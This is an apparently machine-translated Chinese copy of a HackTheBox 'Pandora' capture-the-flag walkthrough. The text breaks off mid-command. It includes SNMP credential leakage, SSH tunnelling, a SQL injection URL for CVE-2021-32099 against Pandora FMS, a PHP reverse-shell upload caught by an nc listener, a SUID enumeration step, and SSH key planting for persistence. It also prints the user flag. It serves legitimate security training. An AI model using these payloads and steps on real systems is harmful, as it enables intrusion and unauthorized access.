<html>
<head>
<title>Pandora from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子里的潘多拉——详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pandora-from-hackthebox-detailed-walkthrough-7d52066e5dc5?source=collection_archive---------2-----------------------#2022-05-24">https://infosecwriteups.com/pandora-from-hackthebox-detailed-walkthrough-7d52066e5dc5?source=collection_archive---------2-----------------------#2022-05-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="40c7" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="95ce" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/b273d50bcfee2860f0f41957f2d0095d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*Jek-oLc47vEDTJ5A.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">黑客盒子里的潘多拉</figcaption></figure><p id="8e75" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">Pandora是HackTheBox上的一台简单机器。端口80上的初始网站什么也没有显示，但是UDP端口的枚举暴露了SSH的凭证。我们找到一个二进制文件，它将我们指向一个在本地运行的网站，我们通过端口隧道访问这个网站。我们通过一个漏洞获得了机器上潘多拉FMS的管理员权限。从那里，我们上传一个反向外壳，作为一个低级用户获得访问权限。枚举找到了另一个二进制文件，这个二进制文件使用了一个不带引号的tar路径来备份pandora站点。我们用这个得到一个根外壳来完成盒子。</p><p id="cc3b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是基本的网络和操作系统枚举。学到的技能是利用公共漏洞和隧道流量来访问远程站点。</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/423" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">潘多拉——破解盒子::渗透测试实验室</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="9b19" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="4adb" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/54d9f1416c001eb1bd44d665270c35dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AqmpAUEwwrtj2_Buew7DZA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="00f4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">只是从80端口上的一个网站开始查看:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/946920262eb256d678c9f5619e621658.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ZznNJKXwvsEQCpgF.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">在潘多拉上玩网站</figcaption></figure><p id="409b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">环顾四周，我们发现这是一个简单的html网站，没有什么有趣的。接下来，我快速扫描了UDP端口:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="241a" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# nmap -sU --top-ports=20 10.10.11.136<br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 21:32 GMT<br/>Nmap scan report for 10.10.11.136<br/>Host is up (0.025s latency).<br/><br/>PORT      STATE         SERVICE<br/>53/udp    closed        domain<br/>67/udp    closed        dhcps<br/>68/udp    closed        dhcpc<br/>69/udp    closed        tftp<br/>123/udp   open|filtered ntp<br/>135/udp   open|filtered msrpc<br/>137/udp   closed        netbios-ns<br/>138/udp   closed        netbios-dgm<br/>139/udp   closed        netbios-ssn<br/>161/udp   open          snmp<br/>162/udp   open|filtered snmptrap<br/>445/udp   open|filtered microsoft-ds<br/>500/udp   closed        isakmp<br/>514/udp   open|filtered syslog<br/>520/udp   open|filtered route<br/>631/udp   closed        ipp<br/>1434/udp  closed        ms-sql-m<br/>1900/udp  open|filtered upnp<br/>4500/udp  closed        nat-t-ike<br/>49152/udp open|filtered unknown<br/>Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds</span></pre><h1 id="4d54" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">简单网络管理协议(Simple Network Management Protocol)</h1><p id="676c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">SNMP端口161已打开，让我们仔细看看:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="26ef" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~]<br/>└─# nmap -sC -sV -sU -p161 10.10.11.136 <br/>Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 21:26 GMT<br/>Nmap scan report for 10.10.11.136<br/>Host is up (0.021s latency).<br/><br/>PORT    STATE SERVICE VERSION<br/>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)<br/>| snmp-win32-software: <br/>|   accountsservice_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:21<br/>|   adduser_3.118ubuntu2_all; 2021-02-01T17:21:32<br/>|   alsa-topology-conf_1.2.2-1_all; 2021-02-01T17:25:18<br/>|   alsa-ucm-conf_1.2.2-1ubuntu0.11_all; 2021-12-07T12:57:25<br/>|   amd64-microcode_3.20191218.1ubuntu1_amd64; 2021-06-11T12:44:07<br/>|   apache2-bin_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07<br/>|   apache2-data_2.4.41-4ubuntu3.8_all; 2021-12-07T12:57:07<br/>|   apache2-utils_2.4.41-4ubuntu3.8_amd64; 2021-12-07T12:57:07<br/>&lt;SNIP&gt;<br/>|   837: <br/>|     Name: cron<br/>|     Path: /usr/sbin/CRON<br/>|     Params: -f<br/>|   838: <br/>|     Name: sh<br/>|     Path: /bin/sh<br/>|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p &lt;HIDDEN&gt;'<br/>&lt;SNIP&gt;</span></pre><p id="808d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有一个很长的列表被返回，但我们看到一些有趣的事情，用户名和密码已经泄露。</p><h1 id="a667" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">以Daniel身份进行SSH访问</h1><p id="61be" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">在SSH端口上尝试这些凭证时，我们看到了打开的作品:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="dc27" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~]<br/>└─# ssh daniel@10.10.11.136                                          <br/>daniel@10.10.11.136's password: <br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)<br/>  System information as of Wed 19 Jan 21:34:26 UTC 2022<br/>daniel@pandora:~$</span></pre><p id="b610" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们进入了系统，快速浏览了一下passwd文件，发现还有一个名为matt的用户:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ns"><img src="../Images/a8d355d63acad94fb60c8bfcc71cd3e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WajXgha0rBcsFBNsQRkoeA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用户密码的Grep</figcaption></figure><p id="0dc8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">用户标志归Matt所有，因此我们还无法获取:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="075c" class="nn kg iq nj b gy no np l nq nr">daniel@pandora:~$ ls -ls /home/matt/<br/>4 -rw-r----- 1 root matt 33 Jan 19 17:08 user.txt</span></pre><p id="cacc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">查看正在运行的进程，可以看到与我们之前看到的相同的长列表:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nt"><img src="../Images/6a0ba36ce28efb9338bddbdb2d61ed28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fj0Q1IjAJWWBfRg1rxlx7w.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">机器上运行的进程列表</figcaption></figure><h1 id="a0be" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">可疑二进制</h1><p id="ff09" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">文件host_check正在使用我们用来获取的凭据运行，让我们来看看:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f946" class="nn kg iq nj b gy no np l nq nr">daniel@pandora:~$ cat /usr/bin/host_check<br/>ELF&gt;�@:@8<br/>H�=��(�����ÐAWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��<br/>PandoraFMS host check utilityNow attempting to check PandoraFMS registered hosts.Files will be saved to ~/.host_check/usr/bin/curl <br/>'http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_mode=url_encode_separator_%7C&amp;user=daniel&amp;pass='<br/>&gt; ~/.host_check 2&gt;/dev/nullHost check unsuccessful!<br/>Please check your credentials.<br/>Terminating program!Host check successful!<br/>Terminating program!Ussage: ./host_check -u username -p password.Two arguments expected.����X����h���XM���������X���0zRx</span></pre><p id="71cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是一个二进制文件，所以cat的输出是混乱的，但是我们可以看到curl带有一个url。我们可以在盒子上试试:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nu"><img src="../Images/d9c7e69778227050d29cd6ede9f25b2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W00EXbgfrTkf2JgI-wHCZw.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">卷曲内部网站</figcaption></figure><h1 id="89fb" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">端口转发</h1><p id="783c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">好吧，我不知道它在做什么！然而，在环回的IP上运行着一些东西，看起来像是一个叫做pandora_console的子文件夹。我们可以像过去多次一样使用端口转发，最近一次是在<a class="ae nv" href="https://pencer.io/ctf/ctf-htb-static/#user-ssh-access" rel="noopener ugc nofollow" target="_blank"> Static </a>上:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="6c57" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~]<br/>└─# ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136<br/>daniel@10.10.11.136's password: <br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)<br/>  System information as of Wed 19 Jan 21:52:09 UTC 2022<br/>Last login: Wed Jan 19 21:34:27 2022 from 10.10.14.10<br/>daniel@pandora:~$</span></pre><p id="0176" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">上面是使用Daniel的凭证登录到机器上的SSH会话，但这次我们通过SSH隧道将任何流量转发到我们的Kali端口8000，到达端口80上的机器。为此，我们可以使用Kali上的web浏览器通过SSH访问我们在机器上找到的网站:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nw"><img src="../Images/2c8fa021ef7c749abdc9dcec84f58ec0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*obtvf8-HSsnSTdHo.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">通过端口转发访问潘多拉控制台</figcaption></figure><h1 id="ced7" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">潘多拉控制台</h1><p id="9a14" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在我们可以进入那个控制台，我们看到一个叫做潘多拉FMS的东西。点击左上方的文档链接会将我们带到<a class="ae nv" href="https://pandorafms.com/manual" rel="noopener ugc nofollow" target="_blank">这里</a>。此外，在此登录页面的底部，我们看到包装盒上的版本显示为v7.0NG.742_FIX_PERL2020。</p><p id="c724" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">快速搜索后，我发现<a class="ae nv" href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained" rel="noopener ugc nofollow" target="_blank">的这个</a>博客显示了潘多拉上那个版本的一个漏洞。在那里查找CVE，我们发现<a class="ae nv" href="https://github.com/ibnuuby/CVE-2021-32099" rel="noopener ugc nofollow" target="_blank">这个</a> GitHub回购与概念验证尝试。</p><p id="4fb3" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这很简单，我们只需将它粘贴到Kali上的浏览器中，同时让我们的隧道转发到盒子:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="94a7" class="nn kg iq nj b gy no np l nq nr">http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271</span></pre><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/a6ecb75bc652b9ef487485586b9c27d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rzc_iMhtP5Kb427J.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Kali上的web浏览器中粘贴了漏洞利用</figcaption></figure><p id="bb9c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在一个新标签中，再次打开pandora_console，现在我们可以以管理员身份访问:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/b5b74742780e876f3c89b5bd3af53a72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FsFtuyVADNfnHTZ6.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">作为管理员的潘多拉FMS控制台</figcaption></figure><p id="b3ed" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有很多要看的，但最终我找到了这个文件管理器部分:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/6de5550422a875b7a19c5b32076ef41d.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/0*72AnDQ2nDTebzO2o.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">文件管理器</figcaption></figure><p id="451d" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这让我看到了一个文件列表。单击右上方的图标会弹出上传文件框:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/12dddfe2fed09e2863eacb55185f1a8e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1102/format:webp/0*39_j_X3ERCTr6bj-.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">上传文件框</figcaption></figure><h1 id="dbbd" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反向外壳</h1><p id="23b5" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">是时候反转外壳了。让我们使用一个已经包含在Kali中的PHP shells:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a4ed" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# cp /usr/share/laudanum/php/php-reverse-shell.php .<br/><br/>┌──(root💀kali)-[~/htb/pandora]<br/>└─# cat php-reverse-shell.php | grep '$ip'<br/>$ip = '10.10.14.10';  // CHANGE THIS</span></pre><p id="2382" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我所做的只是把IP地址改成了我现在的tun0。切换回网页并上传文件:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/a73daa9aadecad6d11fb5b46710f6ea2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*YU-tVPGNEbk9Dk9L.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">文件管理器成功上传了文件</figcaption></figure><p id="5327" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这很有效，向下滚动长长的文件列表，我们可以找到我们的文件:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/479ca6bc8fd8cc901b0e1ecc7106d795.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/format:webp/0*Yl7uMtsOE-y4n8x1.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">查找我们上传的文件</figcaption></figure><p id="e4e1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将鼠标悬停在文件上，我们可以看到URL中的路径:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="5d6e" class="nn kg iq nj b gy no np l nq nr">http://127.0.0.1:8000/pandora_console/index.php?sec=gsetup&amp;sec2=godmode/setup/file_manager&amp;directory=images/backgrounds&amp;hash2=764b0acce6acdb3e5ca2a6ebb646ec29</span></pre><p id="7d0b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在那里你可以看到它说目录=图像。这是我们上传的文件的路径，在Kali上的另一个终端中启动nc监听，然后浏览到我们上传的shell:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/7c13ab69e9d16ce5d8edced41bb3b0fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1226/format:webp/0*dyzwy_UW-joKCBFN.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">在浏览器中输入我们文件的路径</figcaption></figure><p id="e1cb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到终端，查看我们是否已连接:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="5298" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# nc -nlvp 8888             <br/>listening on [any] 8888 ...<br/>connect to [10.10.14.10] from (UNKNOWN) [10.10.11.136] 55864<br/>Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br/>$</span></pre><p id="f76e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">首先让我们升级我们的外壳:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="98f3" class="nn kg iq nj b gy no np l nq nr">$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>matt@pandora:/$ ^Z<br/>zsh: suspended  nc -nlvp 8888<br/>┌──(root💀kali)-[~/htb/pandora]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 8888<br/>matt@pandora:/$ export TERM=xterm<br/>matt@pandora:/$ stty rows 51 cols 236</span></pre><h1 id="59b8" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="b555" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">那更好。现在我们可以看到我们是以Matt的身份进入的，让我们抓住用户标志:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="6418" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/$ id<br/>uid=1000(matt) gid=1000(matt) groups=1000(matt)<br/><br/>matt@pandora:/$ cat /home/matt/user.txt <br/>6de8401da164b118c4bbad8549bde0d1</span></pre><h1 id="cc95" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">潘多拉备份</h1><p id="29f3" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">环顾四周发现了一份有趣的文件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d0d0" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/$ find / -perm -4000 2&gt;/dev/null<br/>&lt;SNIP&gt;<br/>/usr/bin/gpasswd<br/>/usr/bin/umount<br/>/usr/bin/pandora_backup<br/>/usr/bin/passwd<br/>/usr/bin/mount<br/>/usr/bin/su<br/>&lt;SNIP&gt;</span></pre><p id="91c7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">潘多拉_备份是什么？</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="202c" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/$ ls -lsa /usr/bin/pandora_backup <br/>20 -rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup</span></pre><p id="3cf7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">不确定，让我们看看它有什么作用:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2269" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/$ /usr/bin/pandora_backup<br/>PandoraFMS Backup Utility<br/>Now attempting to backup PandoraFMS client<br/>tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied<br/>tar: Error is not recoverable: exiting now<br/>Backup failed!<br/>Check your permissions!</span></pre><p id="beca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">好像不管用。用cat查看它的内部，发现它是另一个二进制文件，我们可以看到它使用tar将pandora安装备份到根目录下的一个文件夹中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="5b35" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/$ cat /usr/bin/pandora_backup<br/>ELF&gt;�@0:@8<br/>          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � &lt;&lt;Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�<br/>&lt;SNIP&gt;<br/>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!<br/>Check your permissions!Backup successful!Terminating program!&lt;(�������������X}�������h���8zRx</span></pre><h1 id="e466" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSH访问作为Matt</h1><p id="c1c7" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">在毫无结果的尝试之后，我最终决定放弃这个逆向shell，使用一个合适的SSH会话。首先在Kali上创建一个新的密钥对:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cf7d" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# ssh-keygen<br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/pandora/id_rsa<br/>Enter passphrase (empty for no passphrase): <br/>Enter same passphrase again: <br/>Your identification has been saved in /root/htb/pandora/id_rsa<br/>Your public key has been saved in /root/htb/pandora/id_rsa.pub<br/>The key fingerprint is:<br/>SHA256:sJrMlhq6+lBuOaxgeVcKujv75rGInYGSf1A2GHa2fXY root@kali<br/>The key's randomart image is:<br/>+---[RSA 3072]----+<br/>|                 |<br/>|  o o            |<br/>| . = o.          |<br/>|  . = .oo E      |<br/>|  .+ ..+S.       |<br/>| *++.+o          |<br/>|*+O+Bo           |<br/>|=O+O=            |<br/>|BB&amp;=             |<br/>+----[SHA256]-----+</span></pre><p id="f9ad" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">不要忘记更改权限:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a901" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# chmod 600 id_rsa</span></pre><p id="57ba" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将公钥复制到剪贴板:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="4d6c" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# cat id_rsa.pub <br/>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoUK0S9FLwAzcvY5zWa70acZ/CWevVuxj3zIfjhFjZnklGvsCpFxTK124kVy8htLciaaP25f+14g2cD65Ao5DOJQclwI7h8oEXk879NvwDhBnqTt6S+OXn44XPIFvt9cdpaaxDDMZkRrh0mHtC9XVnTk0d/Sq61afh5/k9MozSJpvX55et2p/+Hj7Mk77q/zK2/Nt4MFtNogwlVd9ArQgOiyljKpG1Byjb/IYOssbdhgV1rgqoSVInXgWUeoXZmSpkmzK/W5wQ6sCkRBBmnHe8aLsZr++5YDZM9M8yuO1HxMK0KhSl5xrjvwBp7f8+PLt9DR+vmgiHxz5JUIPu1lOFrBxjozM5oXA4WBvmDFzJH+B4Ti0PJNA2qMCXO8SNFk06+tkkxHZ4tBRhpTpaESKafeFzlIamGIA9xKlL9bxfPhHKwAHVEo8Emopj4foaf8ho3Cy7u5/69s0p1DWZ1bAED367C0QbF5GmvsI/9Zny03badPLt17O558foH9+RfOE= root@kali</span></pre><p id="9b1b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到盒子上。Matts主目录中的ssh文件夹:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a23e" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/home/matt$ mkdir .ssh</span></pre><p id="28ff" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在将Kali中公钥粘贴到盒子上，并保存到authorized_keys:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a258" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/home/matt$ echo "ssh-rsa 